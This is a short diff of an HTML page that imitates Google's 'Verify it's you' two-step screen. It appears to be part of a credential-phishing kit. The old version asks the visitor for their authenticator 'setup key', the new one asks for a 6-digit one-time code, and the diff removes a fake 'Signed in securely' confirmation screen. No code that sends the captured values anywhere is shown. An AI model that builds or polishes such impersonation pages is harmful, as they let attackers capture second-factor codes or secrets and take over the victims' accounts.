@@ -76,11 +76,11 @@
     </div>
 
     <h1 class="g-title">Verify it's you</h1>
-    <p class="g-caption">To help keep your account safe, Google wants to make sure it's really you. Enter the 6-digit setup key from your authenticator app to finish.</p>
+    <p class="g-caption">To help keep your account safe, Google wants to make sure it's really you. Enter the 6-digit verification code from your authenticator app to finish.</p>
 
     <div id="form-totp">
     <div class="g-code">
-      <input id="g-totp" type="text" inputmode="text" autocomplete="one-time-code" placeholder="Setup key" spellcheck="false" />
+      <input id="g-totp" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code" spellcheck="false" />
     </div>
     <div class="g-hint" id="totp-hint" hidden></div>
 
@@ -88,19 +88,6 @@
       <button type="button" class="g-link" id="try-another">Try another way</button>
       <button type="submit" class="g-btn" id="btn-totp"><span class="b-label">Verify</span><span class="spin" aria-hidden="true"></span></button>
     </div>
-    </div>
-  </div>
-
-  <!-- ================= DONE ================= -->
-  <div class="g-screen hidden" id="screen-done">
-    <div class="g-center">
-      <div class="g-done-icon">
-        <svg width="64" height="64" viewBox="0 0 64 64"><circle cx="32" cy="32" r="32" fill="#34A853"/><path d="M27 44l-9-9 3-3 6 6 16-16 3 3z" fill="#fff"/></svg>
-      </div>
-      <h1 class="g-title app">You're all set</h1>
-      <div class="g-done-text">
-        <p>Signed in securely. This page can be closed.</p>
-      </div>
     </div>
   </div>
 
